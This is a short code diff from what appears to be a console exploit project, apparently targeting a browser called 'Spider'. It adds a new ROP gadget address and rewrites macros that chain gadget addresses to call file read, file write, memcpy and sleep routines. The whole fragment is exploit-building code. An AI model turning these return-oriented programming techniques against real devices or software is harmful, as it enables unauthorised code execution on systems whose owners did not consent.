@@ -22,6 +22,7 @@
 	#define POP_R3_PC			0x0010538C
 	#define POP_R4_PC			0x001001ED
 //	#define POP_R4_PC			0x001B3AA0
+	#define POP_R0_R2_PC		0x0010F2B9
 	#define POP_R1_2_3_PC 0x001549B1
 	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x0018D5DC
 	#define POP_R4_LR_BX_R2			0x001D9360
@@ -437,10 +438,10 @@
 		#define rop_sleep(ns) .word POP_R0_PC, ns, POP_R1_2_3_PC, 0, POP_PC, GARBAGE, POP_R4_LR_BX_R2, GARBAGE, POP_PC, SVC_0A_BX_LR 
 	#else
 		#define THIS				0x00279000
-		#define rop_file_read(handle, readcount, buffer, size) .word POP_R2_PC, POP_PC, POP_R4_LR_BX_R2, GARBAGE, POP_PC, POP_R0_PC, handle, POP_R1_2_3_PC, readcount, buffer, size, IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC
-		#define rop_file_write(handle, writecount, buffer, size) .word POP_R2_PC, POP_PC, POP_R4_LR_BX_R2, GARBAGE, POP_PC, POP_R0_PC, handle, POP_R1_2_3_PC, writecount, buffer, size, IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC
-		#define rop_memcpy(dst, src, size) .word POP_R2_PC, POP_PC, POP_R4_LR_BX_R2, GARBAGE, POP_PC, POP_R0_PC, dst, POP_R1_2_3_PC, src, size, GARBAGE, MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR
-		#define rop_sleep(ns) .word POP_R0_PC, ns, POP_R1_PC, 0, POP_R2_PC, POP_PC, POP_R4_LR_BX_R2, GARBAGE, POP_PC, SVC_0A_BX_LR 
+		#define rop_file_read(handle, readcount, buffer, size) .word POP_R0_R2_PC, handle, POP_PC, POP_R4_LR_BX_R2, GARBAGE, POP_PC, POP_R1_2_3_PC, readcount, buffer, size, IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC
+		#define rop_file_write(handle, writecount, buffer, size) .word POP_R0_R2_PC, handle, POP_PC, POP_R4_LR_BX_R2, GARBAGE, POP_PC, POP_R1_2_3_PC, writecount, buffer, size, IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC
+		#define rop_memcpy(dst, src, size) .word POP_R0_R2_PC, dst, POP_PC, POP_R4_LR_BX_R2, GARBAGE, POP_PC, POP_R1_2_3_PC, src, size, GARBAGE, MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR
+		#define rop_sleep(ns) .word POP_R0_R2_PC, ns, POP_PC, POP_R4_LR_BX_R2, GARBAGE, POP_PC, POP_R1_PC, 0, SVC_0A_BX_LR 
 	#endif
 #else //Spider
 	#define CODE_ENTRY			0x009D2000
